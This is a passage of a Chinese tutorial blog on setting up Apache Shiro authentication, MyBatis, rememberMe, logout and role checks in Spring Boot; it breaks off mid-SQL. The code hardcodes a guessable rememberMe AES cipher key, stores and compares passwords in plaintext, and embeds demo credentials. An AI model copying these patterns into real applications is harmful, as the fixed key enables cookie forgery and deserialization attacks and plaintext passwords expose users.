<h3 id="05、实现用户认证"><a href="#05、实现用户认证" class="headerlink" title="05、实现用户认证"></a>05、实现用户认证</h3><p>用户认证是通过实现 Shiro 的 <code>Realm</code> 接口来完成的。在 <code>Realm</code> 实现类中，需要重写 <code>doGetAuthenticationInfo</code> 方法，该方法用于验证用户的身份凭证（例如用户名和密码）是否正确。在验证成功后，可以返回一个 <code>AuthenticationInfo</code> 对象，表示用户经过身份验证。</p>
<p>1）首先第一步还是先写一个处理登录的接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostMapping(&quot;/login&quot;)</span><br><span class="line">public String login(String username,String password,Model model)&#123;</span><br><span class="line">    //获取当前用户的 Subject 对象，该对象用于执行身份验证和授权操作。</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    //封装用户登录数据</span><br><span class="line">    UsernamePasswordToken token = new UsernamePasswordToken(username, password);</span><br><span class="line">    //执行登录，如果没有异常就说明ok</span><br><span class="line">    try &#123;</span><br><span class="line">        subject.login(token);</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125; catch (UnknownAccountException e) &#123;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;用户名错误&quot;);</span><br><span class="line">        return &quot;login&quot;;</span><br><span class="line">    &#125; catch (IncorrectCredentialsException e)&#123;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;密码错误&quot;);</span><br><span class="line">        return &quot;login&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）登录页添加返回信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p th:text=&quot;$&#123;msg&#125;&quot; style=&quot;color:red&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c1760c33b5c.png"  alt="image-20240206075803549"></p>
<p>3）处理登录信息调用的是controller，但实际的核心是在自定义的<code>Realm</code>中</p>
<p>给证明一下，这里先把之前咱们自定义的Realm拿来回忆一下，貌似也啥都没写！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c1775f2f34d.png"  alt="image-20240206080342566"></p>
<p>4）随便登录一个用户，看看控制台</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c177b877cc0.png"  alt="image-20240206080511944"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c178c4c2890.png"  alt="image-20240206080940111"></p>
<p>由此证具体的用户认证是通过实现 Shiro 的 <code>Realm</code> 接口来完成的</p>
<p>5）具体如何实现入户认证</p>
<p>一般都是从数据库查询然后与在controller接口处封装的数据对比完成！</p>
<p>现在为了方便演示，我们先用写死的用户信息！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;执行了 -&gt; 认证 doGetAuthenticationInfo&quot;</span>);</span><br><span class="line">    <span class="comment">//一般从数据库中获取</span></span><br><span class="line">    String username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    String password=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取到的用户数据与controller层封装的用户数据进行比较</span></span><br><span class="line">    UsernamePasswordToken userToken= (UsernamePasswordToken) token;</span><br><span class="line">    <span class="keyword">if</span>(!userToken.getUsername().equals(username))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//密码认证，shiro完成</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthenticationInfo</span>(<span class="string">&quot;&quot;</span>,password,<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>6）测试，密码正确就可以成功完成认证</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c242cfda924.png"  alt="image-20240206223142678"></p>
<h3 id="06、整合mybaits"><a href="#06、整合mybaits" class="headerlink" title="06、整合mybaits"></a>06、整合mybaits</h3><p>1）导入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--lombok--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--log4j--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--mysql--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--druid--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2）mybatis配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/shiro?serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">shiro</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="comment">#初始化大小</span></span><br><span class="line">      <span class="attr">initialSize:</span> <span class="number">5</span></span><br><span class="line">      <span class="comment">#最小值</span></span><br><span class="line">      <span class="attr">minIdle:</span> <span class="number">5</span></span><br><span class="line">      <span class="comment">#最大值</span></span><br><span class="line">      <span class="attr">maxActive:</span> <span class="number">20</span></span><br><span class="line">      <span class="comment">#最大等待时间，配置获取连接等待超时，时间单位都是毫秒ms</span></span><br><span class="line">      <span class="attr">maxWait:</span> <span class="number">60000</span></span><br><span class="line">      <span class="comment">#配置间隔多久才进行一次检测，检测需要关闭的空闲连接</span></span><br><span class="line">      <span class="attr">timeBetweenEvictionRunsMillis:</span> <span class="number">60000</span></span><br><span class="line">      <span class="comment">#配置一个连接在池中最小生存的时间</span></span><br><span class="line">      <span class="attr">minEvictableIdleTimeMillis:</span> <span class="number">300000</span></span><br><span class="line">      <span class="attr">validationQuery:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">      <span class="attr">testWhileIdle:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">testOnBorrow:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">testOnReturn:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">poolPreparedStatements:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># 配置监控统计拦截的filters，去掉后监控界面sql无法统计，</span></span><br><span class="line">      <span class="comment">#&#x27;wall&#x27;用于防火墙，SpringBoot中没有log4j，我改成了log4j2</span></span><br><span class="line">      <span class="attr">filters:</span> <span class="string">stat,wall,log4j</span></span><br><span class="line">      <span class="comment">#最大PSCache连接</span></span><br><span class="line">      <span class="attr">maxPoolPreparedStatementPerConnectionSize:</span> <span class="number">20</span></span><br><span class="line">      <span class="attr">useGlobalDataSourceStat:</span> <span class="literal">true</span></span><br><span class="line">      <span class="comment"># 通过connectProperties属性来打开mergeSql功能；慢SQL记录</span></span><br><span class="line">      <span class="attr">connectionProperties:</span> <span class="string">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span></span><br><span class="line">      </span><br><span class="line"><span class="comment"># Mybatis配置</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="comment"># 配置XML映射文件中指定的实体类别名路径</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.example.shiro.pojo</span></span><br><span class="line">  <span class="comment"># 配置MyBatis的xml配置文件路径</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3）idea连接数据库</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c250cc75a4e.png"  alt="image-20240206233123211"></p>
<p>导入sql文件</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `users`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `users`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">6</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>4）实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.shiro.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer rid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5）编写Mapper接口</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c25c40a9f8b.png"  alt="image-20240207002015389"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c25c4f5abef.png"  alt="image-20240207002030453"></p>
<p>6）测试一下</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c25c9c9fd9b.png"  alt="image-20240207002147632"></p>
<p>7）规范一下，我们把Service层也写上</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c25e24ec0c6.png"  alt="image-20240207002820092"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c25e33e80b1.png"  alt="image-20240207002835031"></p>
<p>8）用户认证功能，完善从数据库获取用户信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了 -&gt; 认证 doGetAuthenticationInfo&quot;</span>);</span><br><span class="line">        <span class="type">UsernamePasswordToken</span> <span class="variable">userToken</span> <span class="operator">=</span> (UsernamePasswordToken) token;</span><br><span class="line">        <span class="comment">//数据库获取用户信息</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getByUserName(userToken.getUsername());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == user) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> user.getPassword();</span><br><span class="line">            <span class="comment">//密码认证，shiro完成</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthenticationInfo</span>(token.getPrincipal(), password, getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在就实现了用户信息从数据库获取</p>
<h3 id="07、实现rememberMe功能"><a href="#07、实现rememberMe功能" class="headerlink" title="07、实现rememberMe功能"></a>07、实现rememberMe功能</h3><p>Apache Shiro 提供了 “Remember Me”（记住我）功能，可以使用户在关闭浏览器后再次访问应用程序时无需重新登录。</p>
<p>当用户选择 “Remember Me” 选项并成功登录时，Shiro 将生成一个记住登录状态的令牌，并将其存储在用户浏览器的 Cookie 中。下次用户再次访问应用程序时，Shiro 将从 Cookie 中读取令牌，并使用该令牌自动进行身份验证，而无需用户再次提供用户名和密码。</p>
<p>1）修改配置类，添加一下内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cookie 属性设置</span></span><br><span class="line"><span class="keyword">public</span> SimpleCookie <span class="title function_">rememberMeCookie</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SimpleCookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(<span class="string">&quot;ShiroTest_RememberMe&quot;</span>);</span><br><span class="line">    cookie.setPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    cookie.setHttpOnly(<span class="literal">true</span>);</span><br><span class="line">    cookie.setMaxAge(<span class="number">30</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>);</span><br><span class="line">    <span class="keyword">return</span> cookie;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 Shiro 的  cookie 管理对象</span></span><br><span class="line"><span class="keyword">public</span> CookieRememberMeManager <span class="title function_">rememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">CookieRememberMeManager</span> <span class="variable">cookieRememberMeManager</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">            <span class="title class_">CookieRememberMeManager</span>();</span><br><span class="line">    cookieRememberMeManager.setCookie(rememberMeCookie());</span><br><span class="line">    cookieRememberMeManager.setCipherKey(<span class="string">&quot;1234567890987654&quot;</span>.getBytes());</span><br><span class="line">    <span class="keyword">return</span> cookieRememberMeManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）在<code>安全管理器</code>中设置rememberMe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">securityManager.setRememberMeManager(rememberMeManager());</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c27a3581d5b.png"  alt="image-20240207022803747"></p>
<p>3）配置shiro内置过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fc.put(&quot;/**&quot;, &quot;user&quot;);</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c27d79cb513.png"  alt="image-20240207024200622"></p>
<p>4）修改controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String username,String password,Model model,<span class="meta">@RequestParam(defaultValue =</span></span></span><br><span class="line"><span class="meta"><span class="params">        &quot;false&quot;)</span> <span class="type">boolean</span> rememberMe, HttpSession session)</span>&#123;</span><br><span class="line">    <span class="comment">//获取当前用户的 Subject 对象，该对象用于执行身份验证和授权操作。</span></span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">    <span class="comment">//封装用户登录数据</span></span><br><span class="line">    <span class="type">AuthenticationToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(username, password, rememberMe);</span><br><span class="line">    <span class="comment">//执行登录，如果没有异常就说明ok</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        subject.login(token);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:index&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownAccountException e) &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;用户名错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IncorrectCredentialsException e)&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;msg&quot;</span>,<span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5）修改登录页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/login&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">th:name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">th:name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    记住我：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rememberMe&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>6）退出浏览器再次访问，状态还在！</p>
<h3 id="08、退出功能"><a href="#08、退出功能" class="headerlink" title="08、退出功能"></a>08、退出功能</h3><p>1）添加退出按钮</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/logout&quot;</span>&gt;</span>登出<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2）配置类中添加logout过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fc.put(&quot;/logout&quot;,&quot;logout&quot;);</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/07/65c28e010623e.png"  alt="image-20240207035231353"></p>
<h3 id="09、授权之角色认证"><a href="#09、授权之角色认证" class="headerlink" title="09、授权之角色认证"></a>09、授权之角色认证</h3><p>在 Apache Shiro 中，授权是在 Realm 中完成的。通过在自定义的 Realm 类中实现 <code>doGetAuthorizationInfo</code> 方法来完成授权操作。该方法会在授权过程中被 Shiro 调用，并返回一个 <code>AuthorizationInfo</code> 对象，其中包含了用户的角色、权限等相关信息。</p>
<p>1）编写一个接口用于测试是否拥有角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testAdmin&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testAdmin</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;您是管理员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2）在shiro过滤器中设置，这个接口下的页面之后admin角色才可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fc.put(&quot;/testAdmin&quot;, &quot;roles[admin]&quot;);</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3b7b3a3b87.png"  alt="image-20240208010242903"></p>
<p>3）现在登录后我们访问这个页面，可以看到报401未授权、并且控制台可以看到条用了我们自定义的Realm中的<code>doGetAuthorizationInfo</code>方法</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3b7e44d797.png"  alt="image-20240208010331576"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3b801c6c17.png"  alt="image-20240208010401011"></p>
<p>4）我们在自定义的Realm中的<code>doGetAuthorizationInfo</code>方法中给当前用户添加角色</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123;</span><br><span class="line">    System.out.println(&quot;执行了 -&gt; 授权 doGetAuthorizationInfo&quot;);</span><br><span class="line">    //1 创建对象，存储当前登录的用户的权限和角色</span><br><span class="line">    SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();</span><br><span class="line">    //2 存储角色</span><br><span class="line">    info.addRole(&quot;admin&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>5）再次访问就可以访问到了</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3b9b46aaf8.png"  alt="image-20240208011115697"></p>
<p>6）自定义401错误页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiroFilterFactoryBean.setUnauthorizedUrl(&quot;/401&quot;);</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3baf764677.png"  alt="image-20240208011638613"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/401&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">Unauthorized</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;你没有权限访问！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="10、授权之权限认证"><a href="#10、授权之权限认证" class="headerlink" title="10、授权之权限认证"></a>10、授权之权限认证</h3><p>权限认证和角色认证实现方法类似，就不过多赘述！接下来就直接整合规范一下授权这块</p>
<p>1）创建角色表、权限表、以及角色-权限表</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3bfa6232a4.png"  alt="image-20240208013637299"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Navicat Premium Data Transfer</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Source Server         : shiro</span></span><br><span class="line"><span class="comment"> Source Server Type    : MySQL</span></span><br><span class="line"><span class="comment"> Source Server Version : 50726</span></span><br><span class="line"><span class="comment"> Source Host           : localhost:3306</span></span><br><span class="line"><span class="comment"> Source Schema         : shiro</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Target Server Type    : MySQL</span></span><br><span class="line"><span class="comment"> Target Server Version : 50726</span></span><br><span class="line"><span class="comment"> File Encoding         : 65001</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> Date: 08/02/2024 02:07:24</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span 